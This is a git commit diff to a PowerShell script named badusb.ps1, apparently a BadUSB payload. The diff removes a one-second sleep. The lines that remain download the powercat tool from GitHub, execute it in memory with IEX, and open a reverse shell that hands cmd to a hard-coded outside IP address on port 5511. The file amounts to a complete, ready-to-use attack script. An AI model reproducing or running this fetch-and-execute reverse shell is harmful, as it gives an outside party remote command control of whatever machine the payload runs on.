83f95837349fd584b70f9b9af2f6c4d5fc8b2f83
Berkay YILDIZ <20827063+berkayyildi@users.noreply.github.com>
2019-07-27 17:56:52 +0300

    Update badusb.ps1

--- badusb.ps1
+++ badusb.ps1
@@ -1,3 +1,2 @@
 IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1");
-Start-Sleep -Milliseconds 1000;
 powercat -c 116.203.124.222 -p 5511 -e cmd;
